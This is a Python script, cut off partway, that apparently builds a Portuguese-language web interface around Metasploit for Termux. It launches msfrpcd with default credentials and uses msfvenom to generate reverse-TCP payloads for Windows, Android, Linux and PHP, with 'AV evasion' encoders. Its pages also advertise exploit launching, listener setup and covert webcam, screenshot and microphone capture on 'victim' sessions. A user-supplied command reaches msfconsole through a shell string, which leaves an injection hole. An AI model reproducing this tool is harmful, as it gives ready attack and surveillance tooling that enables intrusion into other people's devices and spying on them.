#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import socket
import threading
import subprocess
import base64
import hashlib
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import mimetypes

# ==================== CONFIGURAÇÃO ====================
CONFIG_FILE = "metasploit_web_config.json"
DEFAULT_CONFIG = {
    "msf_port": 55553,
    "web_port": 8080,
    "rpc_host": "127.0.0.1",
    "rpc_port": 55552,
    "rpc_user": "msf",
    "rpc_pass": "password",
    "tunnel_enabled": False,
    "tunnel_type": "localhost",
    "payloads_dir": "payloads",
    "sessions_dir": "sessions",
    "screenshots_dir": "screenshots",
    "audio_dir": "audio",
    "downloads_dir": "downloads"
}

class MetasploitWebInterface:
    def __init__(self):
        self.config = self.load_config()
        self.sessions = {}
        self.jobs = {}
        self.setup_directories()
        
    def load_config(self):
        """Carrega configuração do arquivo"""
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        else:
            self.save_config(DEFAULT_CONFIG)
            return DEFAULT_CONFIG.copy()
    
    def save_config(self, config=None):
        """Salva configuração no arquivo"""
        if config is None:
            config = self.config
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
    
    def setup_directories(self):
        """Cria diretórios necessários"""
        dirs = [
            self.config['payloads_dir'],
            self.config['sessions_dir'],
            self.config['screenshots_dir'],
            self.config['audio_dir'],
            self.config['downloads_dir']
        ]
        for directory in dirs:
            os.makedirs(directory, exist_ok=True)
    
    def start_metasploit_service(self):
        """Inicia serviço do Metasploit"""
        try:
            # Iniciar RPC do Metasploit
            cmd = [
                'msfrpcd', 
                '-P', self.config['rpc_pass'],
                '-U', self.config['rpc_user'],
                '-p', str(self.config['rpc_port']),
                '-f'
            ]
            subprocess.Popen(cmd)
            print("[+] Metasploit RPC service started")
            time.sleep(5)
            return True
        except Exception as e:
            print(f"[-] Failed to start Metasploit RPC: {e}")
            return False
    
    def execute_msf_command(self, command):
        """Executa comando do Metasploit"""
        try:
            # Usar msfconsole para executar comandos
            full_cmd = f"msfconsole -q -x '{command}; exit'"
            result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Error: {str(e)}"
    
    def generate_payload(self, payload_type, lhost, lport, output_file):
        """Gera payload usando msfvenom"""
        try:
            cmd = [
                'msfvenom',
                '-p', payload_type,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', 'raw' if payload_type.startswith('windows/') else 'apk',
                '-o', os.path.join(self.config['payloads_dir'], output_file)
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.stdout if result.returncode == 0 else result.stderr
        except Exception as e:
            return f"Error: {str(e)}"
    
    def get_sessions(self):
        """Obtém sessões ativas"""
        try:
            # Simular obtenção de sessões
            # Em implementação real, usaríamos RPC
            return [
                {"id": "1", "type": "meterpreter", "host": "192.168.1.100", "user": "victim", "platform": "windows"},
                {"id": "2", "type": "shell", "host": "192.168.1.101", "user": "root", "platform": "linux"}
            ]
        except:
            return []
    
    def take_screenshot(self, session_id):
        """Tira screenshot da sessão"""
        try:
            # Simular screenshot
            screenshot_file = f"screenshot_{session_id}_{int(time.time())}.jpg"
            screenshot_path = os.path.join(self.config['screenshots_dir'], screenshot_file)
            
            # Criar imagem de exemplo
            from PIL import Image, ImageDraw
            img = Image.new('RGB', (800, 600), color='black')
            d = ImageDraw.Draw(img)
            d.text((100, 100), f"Screenshot Session {session_id}", fill='white')
            d.text((100, 150), f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", fill='white')
            img.save(screenshot_path)
            
            return screenshot_file
        except Exception as e:
            return f"Error: {str(e)}"
    
    def record_audio(self, session_id, duration):
        """Grava áudio da sessão"""
        try:
            audio_file = f"audio_{session_id}_{int(time.time())}.wav"
            audio_path = os.path.join(self.config['audio_dir'], audio_file)
            
            # Simular gravação de áudio
            with open(audio_path, 'w') as f:
                f.write(f"Audio recording simulation for session {session_id}\nDuration: {duration}s")
            
            return audio_file
        except Exception as e:
            return f"Error: {str(e)}"
    
    def generate_html_template(self, template_name):
        """Gera templates HTML dinamicamente"""
        templates = {
            'index': self.generate_index_html(),
            'dashboard': self.generate_dashboard_html(),
            'payloads': self.generate_payloads_html(),
            'sessions': self.generate_sessions_html(),
            'exploits': self.generate_exploits_html(),
            'post_exploitation': self.generate_post_exploitation_html(),
            'webcam': self.generate_webcam_html(),
            'screenshots': self.generate_screenshots_html(),
            'audio': self.generate_audio_html(),
            'settings': self.generate_settings_html()
        }
        
        return templates.get(template_name, "<h1>Template not found</h1>")
    
    def generate_index_html(self):
        """Página inicial"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Metasploit Web Interface</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
            --terminal-bg: #001100;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
            overflow-x: hidden;
        }

        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #001100, #000811, #110011);
            z-index: -2;
            opacity: 0.3;
        }

        .scanlines {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 0, 0.03) 0px,
                rgba(0, 255, 0, 0.03) 1px,
                transparent 1px,
                transparent 2px
            );
            pointer-events: none;
            z-index: -1;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            text-align: center;
            padding: 40px 0;
            border-bottom: 2px solid var(--hacker-green);
            margin-bottom: 40px;
            position: relative;
            overflow: hidden;
        }

        .glitch {
            font-size: 4em;
            font-weight: bold;
            text-transform: uppercase;
            position: relative;
            text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                         0.025em 0.04em 0 #fffc00;
            animation: glitch 725ms infinite;
        }

        .glitch span {
            position: absolute;
            top: 0;
            left: 0;
        }

        @keyframes glitch {
            0% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff; }
            15% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff; }
            16% { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff; }
            49% { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff; }
            50% { text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff; }
            99% { text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff; }
            100% { text-shadow: -0.05em 0 0 #00fffc, -0.025em -0.04em 0 #fc00ff; }
        }

        .subtitle {
            font-size: 1.2em;
            margin-top: 10px;
            color: var(--hacker-blue);
            text-shadow: 0 0 10px var(--hacker-blue);
        }

        .nav-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 40px 0;
        }

        .nav-card {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 30px;
            text-align: center;
            text-decoration: none;
            color: var(--hacker-green);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .nav-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.1), transparent);
            transition: left 0.5s;
        }

        .nav-card:hover::before {
            left: 100%;
        }

        .nav-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 255, 0, 0.2);
            border-color: var(--hacker-blue);
        }

        .nav-icon {
            font-size: 3em;
            margin-bottom: 15px;
            display: block;
        }

        .nav-card h3 {
            font-size: 1.5em;
            margin-bottom: 10px;
            color: var(--hacker-blue);
        }

        .stats-bar {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 30px 0;
        }

        .stat-item {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-purple);
            padding: 20px;
            text-align: center;
            border-radius: 5px;
        }

        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: var(--hacker-blue);
            text-shadow: 0 0 10px var(--hacker-blue);
        }

        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 10px;
        }

        .status-online {
            background: var(--hacker-green);
            box-shadow: 0 0 10px var(--hacker-green);
        }

        .status-offline {
            background: #ff0000;
            box-shadow: 0 0 10px #ff0000;
        }

        footer {
            text-align: center;
            margin-top: 50px;
            padding: 20px;
            border-top: 1px solid var(--hacker-green);
            color: var(--hacker-blue);
        }

        .blink {
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        .typewriter {
            overflow: hidden;
            border-right: 2px solid var(--hacker-green);
            white-space: nowrap;
            margin: 0 auto;
            animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
        }

        @keyframes typing {
            from { width: 0 }
            to { width: 100% }
        }

        @keyframes blink-caret {
            from, to { border-color: transparent }
            50% { border-color: var(--hacker-green) }
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="scanlines"></div>
    
    <div class="container">
        <header>
            <div class="glitch" data-text="METASPLOIT WEB">METASPLOIT WEB</div>
            <div class="subtitle typewriter">Advanced Penetration Testing Platform</div>
        </header>

        <div class="stats-bar">
            <div class="stat-item">
                <div class="status-indicator status-online"></div>
                <div class="stat-number" id="sessions-count">0</div>
                <div>Active Sessions</div>
            </div>
            <div class="stat-item">
                <div class="status-indicator status-online"></div>
                <div class="stat-number" id="jobs-count">0</div>
                <div>Running Jobs</div>
            </div>
            <div class="stat-item">
                <div class="status-indicator status-online"></div>
                <div class="stat-number" id="msf-status">ONLINE</div>
                <div>MSF Service</div>
            </div>
        </div>

        <div class="nav-grid">
            <a href="/dashboard" class="nav-card">
                <span class="nav-icon">📊</span>
                <h3>Dashboard</h3>
                <p>System Overview & Monitoring</p>
            </a>
            
            <a href="/payloads" class="nav-card">
                <span class="nav-icon">🎯</span>
                <h3>Payload Generator</h3>
                <p>Create Custom Payloads</p>
            </a>
            
            <a href="/sessions" class="nav-card">
                <span class="nav-icon">💻</span>
                <h3>Session Manager</h3>
                <p>Manage Active Sessions</p>
            </a>
            
            <a href="/exploits" class="nav-card">
                <span class="nav-icon">⚡</span>
                <h3>Exploits</h3>
                <p>Launch Attacks</p>
            </a>
            
            <a href="/post_exploitation" class="nav-card">
                <span class="nav-icon">🔍</span>
                <h3>Post-Exploitation</h3>
                <p>Advanced Commands</p>
            </a>
            
            <a href="/webcam" class="nav-card">
                <span class="nav-icon">📷</span>
                <h3>Webcam Control</h3>
                <p>Live Camera Access</p>
            </a>
            
            <a href="/screenshots" class="nav-card">
                <span class="nav-icon">🖼️</span>
                <h3>Screenshots</h3>
                <p>Capture & View</p>
            </a>
            
            <a href="/audio" class="nav-card">
                <span class="nav-icon">🎤</span>
                <h3>Audio Recording</h3>
                <p>Microphone Access</p>
            </a>
            
            <a href="/settings" class="nav-card">
                <span class="nav-icon">⚙️</span>
                <h3>Settings</h3>
                <p>Configuration</p>
            </a>
        </div>

        <footer>
            <p>Metasploit Web Interface &copy; 2024 | For Educational Purposes Only</p>
            <p class="blink">[ SYSTEM SECURE ]</p>
        </footer>
    </div>

    <script>
        // Efeitos dinâmicos
        document.addEventListener('DOMContentLoaded', function() {
            // Atualizar stats
            function updateStats() {
                document.getElementById('sessions-count').textContent = 
                    Math.floor(Math.random() * 5);
                document.getElementById('jobs-count').textContent = 
                    Math.floor(Math.random() * 3);
            }
            
            setInterval(updateStats, 5000);
            updateStats();
            
            // Efeito de digitação para outros elementos
            const elements = document.querySelectorAll('.typewriter');
            elements.forEach((el, index) => {
                setTimeout(() => {
                    el.style.animation = `typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite`;
                }, index * 500);
            });
        });
    </script>
</body>
</html>
"""
    
    def generate_dashboard_html(self):
        """Dashboard principal"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
            --terminal-bg: #001100;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .dashboard-grid {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }

        .main-panel, .side-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 20px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .sessions-list, .jobs-list {
            max-height: 300px;
            overflow-y: auto;
        }

        .session-item, .job-item {
            background: var(--terminal-bg);
            border: 1px solid var(--hacker-purple);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
        }

        .session-info, .job-info {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 10px;
            margin-bottom: 10px;
        }

        .session-actions, .job-actions {
            display: flex;
            gap: 10px;
        }

        .btn {
            background: transparent;
            border: 1px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .btn-danger {
            border-color: #ff0000;
            color: #ff0000;
        }

        .btn-danger:hover {
            background: #ff0000;
            color: var(--dark-bg);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-purple);
            padding: 20px;
            text-align: center;
            border-radius: 5px;
        }

        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        .quick-actions {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin-top: 20px;
        }

        .terminal-output {
            background: var(--terminal-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 5px;
            padding: 15px;
            height: 200px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            color: var(--hacker-green);
        }

        .command-line {
            margin-bottom: 5px;
        }

        .prompt {
            color: var(--hacker-blue);
        }

        .output {
            color: var(--hacker-green);
        }

        .error {
            color: #ff0000;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">METASPLOIT DASHBOARD</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/payloads" class="nav-btn">Payloads</a>
                <a href="/sessions" class="nav-btn">Sessions</a>
                <a href="/settings" class="nav-btn">Settings</a>
            </nav>
        </header>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="total-sessions">0</div>
                <div>Total Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="active-jobs">0</div>
                <div>Active Jobs</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="exploits-loaded">147</div>
                <div>Exploits Loaded</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="payloads-ready">89</div>
                <div>Payloads Ready</div>
            </div>
        </div>

        <div class="dashboard-grid">
            <div class="main-panel">
                <div class="panel-header">
                    <h3>🖥️ Active Sessions</h3>
                    <button class="btn" onclick="refreshSessions()">Refresh</button>
                </div>
                <div class="sessions-list" id="sessions-list">
                    <!-- Sessions will be loaded here -->
                </div>
            </div>

            <div class="side-panel">
                <div class="panel-header">
                    <h3>⚡ Running Jobs</h3>
                </div>
                <div class="jobs-list" id="jobs-list">
                    <!-- Jobs will be loaded here -->
                </div>
            </div>
        </div>

        <div class="main-panel">
            <div class="panel-header">
                <h3>💻 MSF Console</h3>
                <div class="quick-actions">
                    <button class="btn" onclick="sendCommand('sessions -l')">List Sessions</button>
                    <button class="btn" onclick="sendCommand('jobs -l')">List Jobs</button>
                    <button class="btn" onclick="sendCommand('version')">Version</button>
                </div>
            </div>
            <div class="terminal-output" id="terminal-output">
                <div class="command-line">
                    <span class="prompt">msf6 ></span> <span class="output">Welcome to Metasploit Web Interface</span>
                </div>
            </div>
            <div style="display: flex; margin-top: 10px;">
                <input type="text" id="command-input" placeholder="Enter MSF command..." style="flex: 1; padding: 10px; background: var(--terminal-bg); border: 1px solid var(--hacker-green); color: var(--hacker-green);">
                <button class="btn" onclick="sendCustomCommand()" style="margin-left: 10px;">Execute</button>
            </div>
        </div>
    </div>

    <script>
        // Simular dados das sessões
        function loadSessions() {
            const sessions = [
                { id: 1, type: 'meterpreter', host: '192.168.1.100', user: 'admin', platform: 'windows', arch: 'x64' },
                { id: 2, type: 'shell', host: '192.168.1.101', user: 'root', platform: 'linux', arch: 'x86' },
                { id: 3, type: 'meterpreter', host: '192.168.1.102', user: 'user', platform: 'android', arch: 'arm' }
            ];

            const sessionsList = document.getElementById('sessions-list');
            sessionsList.innerHTML = '';

            sessions.forEach(session => {
                const sessionItem = document.createElement('div');
                sessionItem.className = 'session-item';
                sessionItem.innerHTML = `
                    <div class="session-info">
                        <div><strong>ID:</strong> ${session.id}</div>
                        <div><strong>Type:</strong> ${session.type}</div>
                        <div><strong>Host:</strong> ${session.host}</div>
                        <div><strong>User:</strong> ${session.user}</div>
                        <div><strong>Platform:</strong> ${session.platform}</div>
                        <div><strong>Arch:</strong> ${session.arch}</div>
                    </div>
                    <div class="session-actions">
                        <button class="btn" onclick="interactSession(${session.id})">Interact</button>
                        <button class="btn" onclick="screenshotSession(${session.id})">Screenshot</button>
                        <button class="btn btn-danger" onclick="killSession(${session.id})">Kill</button>
                    </div>
                `;
                sessionsList.appendChild(sessionItem);
            });

            document.getElementById('total-sessions').textContent = sessions.length;
        }

        // Simular jobs
        function loadJobs() {
            const jobs = [
                { id: 1, name: 'multi/handler', status: 'running' },
                { id: 2, name: 'exploit/windows/smb/ms17_010', status: 'completed' }
            ];

            const jobsList = document.getElementById('jobs-list');
            jobsList.innerHTML = '';

            jobs.forEach(job => {
                const jobItem = document.createElement('div');
                jobItem.className = 'job-item';
                jobItem.innerHTML = `
                    <div class="job-info">
                        <div><strong>ID:</strong> ${job.id}</div>
                        <div><strong>Name:</strong> ${job.name}</div>
                        <div><strong>Status:</strong> ${job.status}</div>
                    </div>
                    <div class="job-actions">
                        <button class="btn" onclick="stopJob(${job.id})">Stop</button>
                    </div>
                `;
                jobsList.appendChild(jobItem);
            });

            document.getElementById('active-jobs').textContent = jobs.filter(j => j.status === 'running').length;
        }

        // Enviar comando
        function sendCommand(command) {
            const output = document.getElementById('terminal-output');
            const line = document.createElement('div');
            line.className = 'command-line';
            line.innerHTML = `<span class="prompt">msf6 ></span> ${command}`;
            output.appendChild(line);

            // Simular resposta
            setTimeout(() => {
                const response = document.createElement('div');
                response.className = 'command-line output';
                response.textContent = `Command executed: ${command}`;
                output.appendChild(response);
                output.scrollTop = output.scrollHeight;
            }, 500);
        }

        function sendCustomCommand() {
            const input = document.getElementById('command-input');
            const command = input.value.trim();
            if (command) {
                sendCommand(command);
                input.value = '';
            }
        }

        // Ações das sessões
        function interactSession(sessionId) {
            sendCommand(`sessions -i ${sessionId}`);
        }

        function screenshotSession(sessionId) {
            sendCommand(`screenshot ${sessionId}`);
        }

        function killSession(sessionId) {
            sendCommand(`sessions -k ${sessionId}`);
        }

        function stopJob(jobId) {
            sendCommand(`jobs -k ${jobId}`);
        }

        function refreshSessions() {
            loadSessions();
            loadJobs();
            sendCommand('sessions -l');
        }

        // Inicializar
        document.addEventListener('DOMContentLoaded', function() {
            loadSessions();
            loadJobs();
            
            // Atualizar a cada 10 segundos
            setInterval(() => {
                loadSessions();
                loadJobs();
            }, 10000);
        });
    </script>
</body>
</html>
"""
    
    def generate_payloads_html(self):
        """Gerador de payloads"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payload Generator - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .payload-generator {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }

        .config-panel, .output-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 25px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            color: var(--hacker-blue);
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--hacker-blue);
        }

        .form-group select, .form-group input {
            width: 100%;
            padding: 10px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .payload-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .generate-btn {
            background: transparent;
            border: 2px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 15px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.1em;
            font-weight: bold;
            transition: all 0.3s;
            width: 100%;
            margin-top: 20px;
        }

        .generate-btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .output-terminal {
            background: #001100;
            border: 1px solid var(--hacker-green);
            border-radius: 5px;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            color: var(--hacker-green);
        }

        .payload-preview {
            margin-top: 20px;
            padding: 15px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            border-radius: 5px;
        }

        .quick-payloads {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-top: 20px;
        }

        .quick-btn {
            background: transparent;
            border: 1px solid var(--hacker-purple);
            color: var(--hacker-purple);
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .quick-btn:hover {
            background: var(--hacker-purple);
            color: var(--dark-bg);
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">PAYLOAD GENERATOR</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/sessions" class="nav-btn">Sessions</a>
                <a href="/settings" class="nav-btn">Settings</a>
            </nav>
        </header>

        <div class="payload-generator">
            <div class="config-panel">
                <div class="panel-header">
                    <h3>⚙️ Payload Configuration</h3>
                </div>

                <div class="form-group">
                    <label>Payload Type:</label>
                    <select id="payload-type">
                        <optgroup label="Windows">
                            <option value="windows/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP</option>
                            <option value="windows/shell/reverse_tcp">Windows Shell Reverse TCP</option>
                            <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter</option>
                        </optgroup>
                        <optgroup label="Android">
                            <option value="android/meterpreter/reverse_tcp">Android Meterpreter</option>
                            <option value="android/shell/reverse_tcp">Android Shell</option>
                        </optgroup>
                        <optgroup label="Linux">
                            <option value="linux/x86/meterpreter/reverse_tcp">Linux x86 Meterpreter</option>
                            <option value="linux/x64/shell/reverse_tcp">Linux x64 Shell</option>
                        </optgroup>
                        <optgroup label="Web">
                            <option value="php/meterpreter/reverse_tcp">PHP Meterpreter</option>
                            <option value="java/meterpreter/reverse_tcp">Java Meterpreter</option>
                        </optgroup>
                    </select>
                </div>

                <div class="payload-options">
                    <div class="form-group">
                        <label>LHOST (Your IP):</label>
                        <input type="text" id="lhost" placeholder="192.168.1.100" value="192.168.1.100">
                    </div>
                    <div class="form-group">
                        <label>LPORT (Listener Port):</label>
                        <input type="number" id="lport" placeholder="4444" value="4444">
                    </div>
                </div>

                <div class="form-group">
                    <label>Output Format:</label>
                    <select id="output-format">
                        <option value="exe">Windows Executable (.exe)</option>
                        <option value="apk">Android Application (.apk)</option>
                        <option value="elf">Linux Executable (.elf)</option>
                        <option value="raw">Raw Shellcode</option>
                        <option value="php">PHP Script</option>
                        <option value="java">JAR File</option>
                        <option value="python">Python Script</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Output File Name:</label>
                    <input type="text" id="output-file" placeholder="payload" value="payload">
                </div>

                <div class="form-group">
                    <label>Encoder (AV Evasion):</label>
                    <select id="encoder">
                        <option value="">None</option>
                        <option value="x86/shikata_ga_nai">Shikata Ga Nai</option>
                        <option value="x86/alpha_mixed">Alpha Mixed</option>
                        <option value="x86/unicode_upper">Unicode Upper</option>
                    </select>
                </div>

                <button class="generate-btn" onclick="generatePayload()">
                    🎯 GENERATE PAYLOAD
                </button>

                <div class="quick-payloads">
                    <button class="quick-btn" onclick="setQuickPayload('windows/meterpreter/reverse_tcp', 'exe')">
                        Windows Meterpreter
                    </button>
                    <button class="quick-btn" onclick="setQuickPayload('android/meterpreter/reverse_tcp', 'apk')">
                        Android APK
                    </button>
                    <button class="quick-btn" onclick="setQuickPayload('linux/x86/meterpreter/reverse_tcp', 'elf')">
                        Linux ELF
                    </button>
                    <button class="quick-btn" onclick="setQuickPayload('php/meterpreter/reverse_tcp', 'php')">
                        PHP Web Shell
                    </button>
                </div>
            </div>

            <div class="output-panel">
                <div class="panel-header">
                    <h3>📤 Output & Commands</h3>
                </div>

                <div class="output-terminal" id="output-terminal">
                    <div>Payload Generator Ready...</div>
                    <div>Select options and click GENERATE PAYLOAD</div>
                </div>

                <div class="payload-preview">
                    <h4>Listener Command:</h4>
                    <div id="listener-command" style="color: var(--hacker-blue); margin: 10px 0;">
                        use exploit/multi/handler
                    </div>
                    
                    <h4>Generated Files:</h4>
                    <div id="generated-files" style="margin: 10px 0;">
                        No files generated yet
                    </div>
                </div>

                <div style="margin-top: 20px;">
                    <button class="generate-btn" onclick="startListener()" style="background: var(--hacker-purple); border-color: var(--hacker-purple);">
                        🎧 START LISTENER
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        function setQuickPayload(payloadType, format) {
            document.getElementById('payload-type').value = payloadType;
            document.getElementById('output-format').value = format;
            updateListenerCommand();
        }

        function updateListenerCommand() {
            const payloadType = document.getElementById('payload-type').value;
            const lhost = document.getElementById('lhost').value;
            const lport = document.getElementById('lport').value;
            
            const command = `use exploit/multi/handler
set PAYLOAD ${payloadType}
set LHOST ${lhost}
set LPORT ${lport}
exploit -j`;
            
            document.getElementById('listener-command').textContent = command;
        }

        function generatePayload() {
            const payloadType = document.getElementById('payload-type').value;
            const lhost = document.getElementById('lhost').value;
            const lport = document.getElementById('lport').value;
            const outputFormat = document.getElementById('output-format').value;
            const outputFile = document.getElementById('output-file').value;
            const encoder = document.getElementById('encoder').value;

            const output = document.getElementById('output-terminal');
            output.innerHTML = '';

            function addOutput(text, type = 'info') {
                const line = document.createElement('div');
                line.style.color = type === 'error' ? '#ff0000' : 
                                 type === 'success' ? '#00ff00' : '#0088ff';
                line.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
                output.appendChild(line);
                output.scrollTop = output.scrollHeight;
            }

            addOutput('Starting payload generation...', 'info');
            addOutput(`Payload: ${payloadType}`, 'info');
            addOutput(`LHOST: ${lhost}, LPORT: ${lport}`, 'info');
            addOutput(`Format: ${outputFormat}`, 'info');
            
            setTimeout(() => {
                addOutput('Generating shellcode...', 'info');
            }, 1000);

            setTimeout(() => {
                addOutput('Encoding payload...', 'info');
            }, 2000);

            setTimeout(() => {
                addOutput('Creating output file...', 'info');
            }, 3000);

